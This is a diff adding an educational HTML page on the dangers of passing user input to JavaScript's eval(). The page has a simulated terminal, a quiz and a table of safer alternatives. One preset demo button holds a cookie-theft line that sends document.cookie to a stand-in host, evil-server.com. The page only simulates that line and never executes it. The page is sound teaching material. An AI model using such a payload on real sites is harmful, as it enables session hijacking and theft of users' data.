@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Risks of eval() Function</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #f5f5f5;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .code-display {
+            background-color: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            margin: 20px 0;
+            font-size: 16px;
+        }
+        .highlight {
+            color: #e74c3c;
+            font-weight: bold;
+        }
+        .warning-section {
+            background-color: #ffecb3;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 4px solid #f39c12;
+            margin: 20px 0;
+        }
+        .interactive-section {
+            margin: 30px 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        .terminal {
+            background-color: #2d3436;
+            color: #fff;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', Courier, monospace;
+            margin-top: 15px;
+            height: 300px;
+            overflow-y: auto;
+            position: relative;
+        }
+        .prompt {
+            color: #00cd00;
+            font-weight: bold;
+        }
+        .output {
+            color: #dfe6e9;
+            margin-top: 10px;
+            white-space: pre-wrap;
+        }
+        .input-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .user-input {
+            flex-grow: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-family: monospace;
+        }
+        .execute-btn {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 0 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.2s;
+        }
+        .execute-btn:hover {
+            background-color: #2980b9;
+        }
+        .attack-button {
+            background-color: #e74c3c;
+            padding: 8px 16px;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .attack-button:hover {
+            background-color: #c0392b;
+        }
+        .scenario-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+        .attack-warning {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: #e74c3c;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 5px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            display: none;
+            z-index: 100;
+        }
+        .attack-warning.show {
+            display: block;
+            animation: fade-in-out 3s forwards;
+        }
+        @keyframes fade-in-out {
+            0% { opacity: 0; transform: translateY(-20px); }
+            10% { opacity: 1; transform: translateY(0); }
+            90% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(-20px); }
+        }
+        .conclusion {
+            background-color: #e8f4fc;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 30px;
+            border-left: 4px solid #3498db;
+        }
+        .attack-examples {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .alternatives {
+            background-color: #d5f5e3;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 4px solid #2ecc71;
+            margin: 20px 0;
+        }
+        .correct-answer {
+            background-color: #2ecc71;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 3px;
+            margin-right: 5px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        tr:hover {
+            background-color: #f5f5f5;
+        }
+        .animation-container {
+            height: 200px;
+            position: relative;
+            margin: 30px 0;
+            overflow: hidden;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .animation-object {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background-color: #3498db;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+        .server {
+            position: absolute;
+            right: 30px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 100px;
+            height: 150px;
+            background-color: #2c3e50;
+            border-radius: 5px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .code-span {
+            font-family: monospace;
+            background-color: #f8f8f8;
+            padding: 2px 5px;
+            border-radius: 3px;
+            border: 1px solid #ddd;
+        }
+        .hidden {
+            display: none;
+        }
+        .user {
+            position: absolute;
+            left: 30px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 50px;
+            height: 50px;
+            background-color: #3498db;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+        }
+        .hacker {
+            position: absolute;
+            left: 30px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 50px;
+            height: 50px;
+            background-color: #e74c3c;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+        }
+        .packet {
+            position: absolute;
+            width: 30px;
+            height: 20px;
+            background-color: #7f8c8d;
+            border-radius: 3px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+        .malicious-packet {
+            background-color: #e74c3c;
+        }
+        .answer-choice {
+            margin: 10px 0;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+        .answer-choice:hover {
+            background-color: #f5f5f5;
+        }
+        .correct {
+            border-color: #2ecc71;
+            background-color: rgba(46, 204, 113, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Security Risks of eval() Function</h1>
+        
+        <div class="code-display">
+            const userInput = prompt('Enter command:'); <br>
+            <span class="highlight">eval(userInput);</span>
+        </div>
+        
+        <div class="warning-section">
+            <h2>The Problem:</h2>
+            <p>The code above allows user input to be executed directly as JavaScript code without any validation or sanitization.</p>
+        </div>
+        
+        <div class="interactive-section">
+            <div class="scenario-title">Interactive Demo: Risks of eval()</div>
+            <p>Enter some JavaScript code below or click one of the preset examples:</p>
+            
+            <div class="attack-examples">
+                <button class="attack-button" data-code="alert('This is a simple alert')">Simple Alert</button>
+                <button class="attack-button" data-code="document.body.style.backgroundColor = 'red'">Change Background</button>
+                <button class="attack-button" data-code="fetch('https://evil-server.com/steal?cookie=' + document.cookie)">Cookie Theft Attempt</button>
+                <button class="attack-button" data-code="for(let i=0; i<1000; i++) { console.log('Browser hang simulation'); }">Performance Issue</button>
+                <button class="attack-button" data-code="const stolenData = { username: 'admin', password: 'password123', email: 'admin@example.com' }; console.log('Data stolen:', stolenData);">Data Theft Simulation</button>
+            </div>
+            
+            <div class="input-container">
+                <input type="text" class="user-input" id="eval-input" placeholder="Enter JavaScript code here..." value="2 + 2">
+                <button class="execute-btn" id="execute-btn">Execute</button>
+            </div>
+            
+            <div class="terminal" id="terminal">
+                <div class="prompt">> Waiting for input...</div>
+            </div>
+        </div>
+        
+        <div class="animation-container" id="animation-container">
+            <div class="user">👤</div>
+            <div class="server">
+                <div>Server</div>
+                <div style="font-size: 12px; margin-top: 5px;">eval(input)</div>
+            </div>
+            <div class="hacker hidden">🕵️</div>
+        </div>
+        
+        <div class="attack-warning" id="attack-warning">
+            XSS Attack Detected!
+        </div>
+        
+        <div>
+            <h2>What's the problem with the code above?</h2>
+            
+            <div class="answer-choice" id="option-a">
+                <strong>a) Vulnerable to XSS attacks</strong>
+                <p>Because eval() executes strings as code, attackers can inject malicious JavaScript that can steal data, modify the page, or perform unauthorized actions.</p>
+            </div>
+            
+            <div class="answer-choice" id="option-b">
+                <strong>b) Performance impact</strong>
+                <p>Using eval() is slower than other alternatives because it requires the JavaScript engine to parse and compile code at runtime.</p>
+            </div>
+            
+            <div class="answer-choice" id="option-c">
+                <strong>c) Only works with numbers</strong>
+                <p>The eval() function is restricted to evaluating numeric expressions and cannot handle strings or other data types.</p>
+            </div>
+            
+            <div class="answer-choice" id="option-d">
+                <strong>d) Can crash with arbitrary user input</strong>
+                <p>The application might crash if users enter unexpected data formats or invalid JavaScript syntax.</p>
+            </div>
+        </div>
+        
+        <div class="conclusion">
+            <h2><span class="correct-answer">Correct Answer: a)</span> Vulnerable to XSS attacks</h2>
+            <p>The <code>eval()</code> function executes the string passed to it as JavaScript code. When this string comes from user input without any validation or sanitization, it creates a serious security vulnerability.</p>
+            <p>An attacker can inject malicious code that can:</p>
+            <ul>
+                <li>Steal sensitive information (cookies, session tokens, personal data)</li>
+                <li>Perform actions on behalf of the user</li>
+                <li>Modify page content or redirect users</li>
+                <li>Execute server requests with the user's credentials</li>
+            </ul>
+            <p>While performance issues (b) are also a concern with eval(), and crashes (d) might occur with invalid syntax, the security risk from XSS attacks is by far the most serious consequence.</p>
+        </div>
+        
+        <div class="alternatives">
+            <h2>Safer Alternatives:</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Instead of eval()</th>
+                        <th>Use</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>For mathematical expressions</td>
+                        <td>JavaScript math libraries or operations</td>
+                    </tr>
+                    <tr>
+                        <td>For JSON parsing</td>
+                        <td><code>JSON.parse()</code></td>
+                    </tr>
+                    <tr>
+                        <td>For dynamic property access</td>
+                        <td>Bracket notation: <code>obj[propertyName]</code></td>
+                    </tr>
+                    <tr>
+                        <td>For function construction</td>
+                        <td>Factory functions or classes with strict validation</td>
+                    </tr>
+                </tbody>
+            </table>
+            <p>Remember: <strong>Never use eval() with untrusted input</strong>. If eval() is absolutely necessary, ensure all input is thoroughly validated and sanitized.</p>
+        </div>
+    </div>
+
+    <script>
+        // Terminal functionality
+        const terminal = document.getElementById('terminal');
+        const evalInput = document.getElementById('eval-input');
+        const executeBtn = document.getElementById('execute-btn');
+        
+        function addToTerminal(text, isPrompt = false, isError = false) {
+            const div = document.createElement('div');
+            div.className = isPrompt ? 'prompt' : 'output';
+            if (isError) div.style.color = '#e74c3c';
+            div.textContent = text;
+            terminal.appendChild(div);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function executeEval() {
+            const code = evalInput.value;
+            addToTerminal(`> ${code}`, true);
+            
+            try {
+                // For demo purposes, we'll actually log the result rather than executing it
+                // In a real scenario, this would be dangerous!
+                const result = simulateEval(code);
+                addToTerminal(result);
+                
+                // Animate the execution
+                animateCodeExecution(code);
+                
+                // Show attack warning for certain inputs
+                if (code.includes('alert') || 
+                    code.includes('fetch') || 
+                    code.includes('cookie') || 
+                    code.includes('document.body') ||
+                    code.includes('stolen')) {
+                    showAttackWarning();
+                }
+            } catch (error) {
+                addToTerminal(`Error: ${error.message}`, false, true);
+            }
+        }
+        
+        // Simulate eval without actually executing potentially harmful code
+        function simulateEval(code) {
+            // Safe operations to actually execute
+            if (/^\s*\d+(\s*[\+\-\*\/]\s*\d+)*\s*$/.test(code)) {
+                return eval(code);
+            }
+            
+            // For other code, simulate the result
+            if (code.includes('alert')) {
+                return "[Simulated] Alert dialog shown";
+            } else if (code.includes('document.body.style')) {
+                return "[Simulated] Document style modified";
+            } else if (code.includes('fetch') || code.includes('cookie')) {
+                return "[Simulated] XSS Attack: Data sent to remote server";
+            } else if (code.includes('for') && code.includes('console.log')) {
+                return "[Simulated] Loop executed, potential performance impact";
+            } else if (code.includes('stolenData')) {
+                return "[Simulated] XSS Attack: Sensitive data accessed\n{\n  username: 'admin',\n  password: '[REDACTED]',\n  email: 'admin@example.com'\n}";
+            }
+            
+            return "[Simulated] Code executed: " + code;
+        }
+        
+        // Animation
+        function animateCodeExecution(code) {
+            const isMalicious = code.includes('alert') || 
+                               code.includes('fetch') || 
+                               code.includes('cookie') || 
+                               code.includes('document.body') ||
+                               code.includes('stolen');
+            
+            const container = document.getElementById('animation-container');
+            const user = document.querySelector('.user');
+            const hacker = document.querySelector('.hacker');
+            const server = document.querySelector('.server');
+            
+            // Reset animation
+            while (container.querySelector('.packet')) {
+                container.querySelector('.packet').remove();
+            }
+            
+            if (isMalicious) {
+                // Show hacker for malicious code
+                hacker.classList.remove('hidden');
+                user.classList.add('hidden');
+                
+                // Create malicious packet
+                const packet = document.createElement('div');
+                packet.className = 'packet malicious-packet';
+                packet.textContent = '⚠️';
+                packet.style.left = '70px';
+                packet.style.top = '50%';
+                packet.style.transform = 'translateY(-50%)';
+                container.appendChild(packet);
+                
+                // Animate packet to server
+                gsap.to(packet, {
+                    left: server.offsetLeft - 20,
+                    duration: 1.5,
+                    ease: "power1.inOut",
+                    onComplete: () => {
+                        // Server processes malicious code
+                        gsap.to(server, {
+                            backgroundColor: '#e74c3c',
+                            duration: 0.3,
+                            repeat: 3,
+                            yoyo: true
+                        });
+                        
+                        // Return data packet to attacker
+                        const responsePacket = document.createElement('div');
+                        responsePacket.className = 'packet malicious-packet';
+                        responsePacket.textContent = '💰';
+                        responsePacket.style.left = server.offsetLeft - 20;
+                        responsePacket.style.top = '50%';
+                        responsePacket.style.transform = 'translateY(-50%)';
+                        container.appendChild(responsePacket);
+                        
+                        gsap.to(responsePacket, {
+                            left: '70px',
+                            duration: 1.5,
+                            ease: "power1.inOut"
+                        });
+                    }
+                });
+            } else {
+                // Show user for normal code
+                user.classList.remove('hidden');
+                hacker.classList.add('hidden');
+                
+                // Create normal packet
+                const packet = document.createElement('div');
+                packet.className = 'packet';
+                packet.textContent = '📦';
+                packet.style.left = '70px';
+                packet.style.top = '50%';
+                packet.style.transform = 'translateY(-50%)';
+                container.appendChild(packet);
+                
+                // Animate packet to server
+                gsap.to(packet, {
+                    left: server.offsetLeft - 20,
+                    duration: 1,
+                    ease: "power1.inOut",
+                    onComplete: () => {
+                        // Server processes code
+                        gsap.to(server, {
+                            backgroundColor: '#3498db',
+                            duration: 0.3,
+                            repeat: 1,
+                            yoyo: true
+                        });
+                        
+                        // Return data packet to user
+                        const responsePacket = document.createElement('div');
+                        responsePacket.className = 'packet';
+                        responsePacket.textContent = '✓';
+                        responsePacket.style.left = server.offsetLeft - 20;
+                        responsePacket.style.top = '50%';
+                        responsePacket.style.transform = 'translateY(-50%)';
+                        container.appendChild(responsePacket);
+                        
+                        gsap.to(responsePacket, {
+                            left: '70px',
+                            duration: 1,
+                            ease: "power1.inOut"
+                        });
+                    }
+                });
+            }
+        }
+        
+        function showAttackWarning() {
+            const warning = document.getElementById('attack-warning');
+            warning.classList.add('show');
+            setTimeout(() => {
+                warning.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Event listeners
+        executeBtn.addEventListener('click', executeEval);
+        evalInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') executeEval();
+        });
+        
+        // Handle preset attack buttons
+        document.querySelectorAll('.attack-button').forEach(button => {
+            button.addEventListener('click', () => {
+                evalInput.value = button.getAttribute('data-code');
+                executeEval();
+            });
+        });
+        
+        // Highlight the correct answer
+        document.getElementById('option-a').classList.add('correct');
+        
+        // Initial animation
+        document.addEventListener('DOMContentLoaded', function() {
+            // Animate sections
+            gsap.from('.warning-section', { 
+                opacity: 0, 
+                y: 20, 
+                duration: 0.7, 
+                ease: "power2.out",
+                delay: 0.5
+            });
+            
+            gsap.from('.interactive-section', { 
+                opacity: 0, 
+                y: 20, 
+                duration: 0.7, 
+                ease: "power2.out",
+                delay: 0.8
+            });
+            
+            gsap.from('.animation-container', { 
+                opacity: 0, 
+                y: 20, 
+                duration: 0.7, 
+                ease: "power2.out",
+                delay: 1.1
+            });
+            
+            gsap.from('.answer-choice', { 
+                opacity: 0, 
+                y: 20, 
+                duration: 0.7, 
+                stagger: 0.2,
+                ease: "power2.out",
+                delay: 1.4
+            });
+            
+            gsap.from('.conclusion', { 
+                opacity: 0, 
+                y: 20, 
+                duration: 0.7, 
+                ease: "power2.out",
+                delay: 1.8
+            });
+            
+            gsap.from('.alternatives', { 
+                opacity: 0, 
+                y: 20, 
+                duration: 0.7, 
+                ease: "power2.out",
+                delay: 2.2
+            });
+            
+            // Highlight correct answer with animation
+            setTimeout(() => {
+                gsap.to('#option-a', {
+                    backgroundColor: 'rgba(46, 204, 113, 0.1)',
+                    borderColor: '#2ecc71',
+                    boxShadow: '0 0 10px rgba(46, 204, 113, 0.5)',
+                    duration: 0.5,
+                    repeat: 1,
+                    yoyo: true
+                });
+            }, 2500);
+        });
+    </script>
+</body>
+</html>
